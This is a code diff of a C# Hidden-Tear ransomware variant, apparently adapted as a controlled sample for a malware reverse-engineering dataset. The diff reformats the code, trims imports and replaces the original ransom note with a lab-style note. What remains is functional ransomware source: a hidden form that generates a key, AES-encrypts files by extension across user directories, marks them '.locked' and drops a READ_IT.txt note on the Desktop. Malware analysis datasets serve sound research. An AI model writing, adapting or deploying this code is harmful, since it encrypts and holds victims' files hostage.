@@ -1,33 +1,22 @@
 // Hidden-Tear Ransomware Variant with Local Encryption and Coercion via Ransomnote
+
 using System;
-using System.Diagnostics;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
-using System.Drawing;
 using System.Linq;
 using System.Text;
-using System.Threading.Tasks;
 using System.Windows.Forms;
-using System.Security;
 using System.Security.Cryptography;
 using System.IO;
-using System.Net;
-using Microsoft.Win32;
-using System.Runtime.InteropServices;
-using System.Text.RegularExpressions;
 
 namespace A01_2_Ransomware_Encrypt_and_Coerce
 {
-public
-    partial class Form1 : Form
+    public
+        partial class Form1 : Form
     {
         string userName = Environment.UserName;
-        string computerName = System.Environment.MachineName.ToString();
         string userDir = "C:\\Users\\";
 
-    public
-        Form1()
+        public
+            Form1()
         {
             this.Load += new EventHandler(Form1_Load);
             this.Shown += new EventHandler(Form_Shown);
@@ -38,8 +27,8 @@ public
             this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
         }
 
-    private
-        void Form1_Load(object sender, EventArgs e)
+        private
+            void Form1_Load(object sender, EventArgs e)
         {
             Opacity = 0;
             this.ShowInTaskbar = false;
@@ -47,20 +36,20 @@ public
             startAction();
         }
 
-    private
-        void Form_Shown(object sender, EventArgs e)
+        private
+            void Form_Shown(object sender, EventArgs e)
         {
             Visible = false;
         }
 
         // AES encryption algorithm
-    public
-        byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
+        public
+            byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
         {
             byte[] encryptedBytes = null;
-            byte[] saltBytes = new byte[]{1, 2, 3, 4, 5, 6, 7, 8};
+            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
 
-            using(MemoryStream ms = new MemoryStream())
+            using (MemoryStream ms = new MemoryStream())
             {
                 using Aes AES = Aes.Create();
 
@@ -80,7 +69,7 @@ public
                 AES.Key = derived[..32];
                 AES.IV = derived[32..48];
 
-                using(var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
+                using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                 {
                     cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                     cs.Close();
@@ -93,8 +82,8 @@ public
         }
 
         // creates random encryption key
-    public
-        string GenerateKey(int length)
+        public
+            string GenerateKey(int length)
         {
             const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
             StringBuilder res = new StringBuilder();
@@ -108,8 +97,8 @@ public
 
 
         // Encrypts single file
-    public
-        void EncryptFile(string file, string password)
+        public
+            void EncryptFile(string file, string password)
         {
             if (file.EndsWith(".locked", StringComparison.OrdinalIgnoreCase))
             {
@@ -129,8 +118,8 @@ public
         }
 
         // Encrypts a directory and all its subdirectories
-    public
-        void EncryptDirectory(string location, string password)
+        public
+            void EncryptDirectory(string location, string password)
         {
 
             // extensions to be encrypt
@@ -168,8 +157,8 @@ public
         }
 
         // Starts the encryption process
-    public
-        void startAction()
+        public
+            void startAction()
         {
             string password = GenerateKey(15);
             string keyPath = @"C:\Users\Public\A01_2_Lab_Encryption_Key.txt";
@@ -185,12 +174,18 @@ public
             System.Windows.Forms.Application.Exit();
         }
 
-    public
-        void messageCreator()
+        public
+            void messageCreator()
         {
             string path = @"\Desktop\READ_IT.txt";
             string fullpath = userDir + userName + path;
-            string[] lines = {"Files have been encrypted with hidden tear", "Send me some bitcoins or kebab", "And I also hate night clubs, desserts, being drunk."};
+            string[] lines =
+            {
+                "A01_2 controlled ransomware/coercion sample.",
+                "Files in C:\\Users\\Public\\A01_TestData have been encrypted.",
+                "This note is generated for malware reverse-engineering dataset analysis.",
+                "No payment is required. Use the lab key file to decrypt test files."
+            };
             System.IO.File.WriteAllLines(fullpath, lines);
         }
     }
